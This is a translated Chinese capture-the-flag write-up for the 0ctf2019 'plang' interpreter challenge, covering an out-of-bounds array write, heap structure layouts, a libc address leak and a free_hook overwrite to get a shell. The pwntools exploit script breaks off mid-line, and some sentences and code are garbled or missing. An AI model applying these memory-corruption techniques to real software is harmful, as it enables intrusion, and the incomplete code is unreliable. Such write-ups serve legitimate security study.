# 从crash到getshell 0ctf2019_plang 详解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
这是0ctf中的一道题目，题目提供了一个poc文件
    var a = "This is a PoC!"
    System.print(a)
    var b = [1, 2, 3]
    b[0x80000000] = 0x123
我们在ida中的字符串中能够发现如下的代码：
可以看出这是一个类似于javascript的解释器。
gdb加载程序，并设置参数，程序crash了。这是因为
## 漏洞分析：
我们发现rcx寄存器是个非法的地址。查看代码我们发现rcx是通过rax+rdx获取的，而rax和rdx是在栈上获取的。
通过调试我们可以看到，rax是数组b的基址，rdx是数组的偏移。漏洞点就在数组存在越界读写。
为了利用该漏洞，我们需要分析清楚该js解释器的数据结构，才能来进行读写。
分析数据结构，构造如下的poc
    var a = "This is a PoC!"
    System.print(a)
    var b = [1, 2, "aaaaa",[3,"ddddd"]]
    Strcut obj_ptr{
    long unkown;
    void *ptr1;
    void *ptr2;
    objbuffrer *ptr;
    int size;
    int size;
    }
我们在数组中声明的变量值为1和2，在堆中却为0x3ff0000000000000和0x4000000000000000，实际上是用浮点形式存储的。所以我们读写的数据都要按照浮点形式存储。
    Struct objtype{
    long type;//如果是double类型的为4，如果为其他类型的为5
    union{
            double value;
            obj_ptr* obj;
        };
    }
    struct objstr{
        int type;
        int padding;
        void* ptr1;
        void* ptr2;
        int some_val;
        int size;
    char[] contents;
    };
## 漏洞利用：
### 地址泄露
在分析程序的时候，我们注意到Objstr类型，有一个size位，如果利用任意地址写，将Objstr类型的size位改大，就能打印出很多地址，而后面的内存中正好有libc有关的地址。
这里有几个地方需要注意：一个是偏移的计算，一个是要将size转化成double类型。
如果我们直接打印字符串a，后面的’x00’会截断，我们通过下面的方式逐个字节读取
### 任意地址写
我们发现obj_ptr结构体中存在一个指针，将objbuffrer 的指针改写成我们想改写的地址即可。
    Strcut obj_ptr{
    long unkown;
    void *ptr1;
    void *ptr2;
    objbuffrer *ptr;
    int size;
    int size;
    }
尝试了malloc_hook和free_hook后发现有个onegadget劫持free_hook可以拿到shell。
## exp:
    from pwn import *
    import struct
    EXE='./plang'
    context.binary = EXE
    elf = ELF(EXE)
    libc=elf.libc
    io=process(EXE)
    def dbg(s=''):
    gdb.attach(io,s)
    def runscript(pay):
    io.sendlineafter('> ',pay)
    def int2double(num):
    return struct.pack("